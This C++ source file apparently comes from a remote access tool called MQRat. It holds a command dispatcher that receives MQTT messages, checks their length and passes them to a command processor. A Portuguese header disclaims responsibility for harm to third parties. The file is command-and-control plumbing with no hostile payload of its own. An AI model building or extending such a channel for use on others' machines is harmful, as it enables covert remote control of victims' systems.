/*
	This file is part of MQRat.
	
	Copyright (C) 2019  MQRat Project

	O autor não se responsabiliza por variantes (ou sources originais) deste software 
	que estejam sendo utilizadas para prejudicar terceiros.
*/

#include <string>
#include <thread>
#include <memory>
#include <cstring>
#include <stdexcept>
#include "command_dispatcher.hpp"
#include "command_processor.hpp"
#include "mqtt_client.hpp"
#include "log.hpp"
#include "MQTTClient.h"

using namespace std;

CommandDispatcher::CommandDispatcher()
{
    this->message = nullptr;
    this->client = nullptr;
    this->cp = nullptr;
}

CommandDispatcher::CommandDispatcher(MQTTClient_message *msg, MqttClient *client, char *topic)
{
    this->message = msg;
    this->client = client;
    this->topic = topic;
    this->cp = new CommandProcessor("", client);
}

void CommandDispatcher::setMessage(MQTTClient_message *new_msg)
{
    this->message = new_msg;
}

void CommandDispatcher::setTopic(char *topic_name)
{
    this->topic = topic_name;
}

void CommandDispatcher::Dispatch()
{
    if(message->payloadlen <= 0) {
        Log::LogError("Invalid payload length");
        client->SendError();
        return;
    }

    // Check command size
    if(message->payloadlen > MAX_CMD_SIZE) {
        Log::LogError("Too big command size: " + to_string(message->payloadlen));
        client->SendError();
        return;
    }

    // Setup command processor
    auto cmd = static_cast<char*>(message->payload);
    this->cp->setCommand(cmd);

    // Analyse command syntax
    cp->Process();
}

void CommandDispatcher::Prepare()
{
    cp->Setup();
}
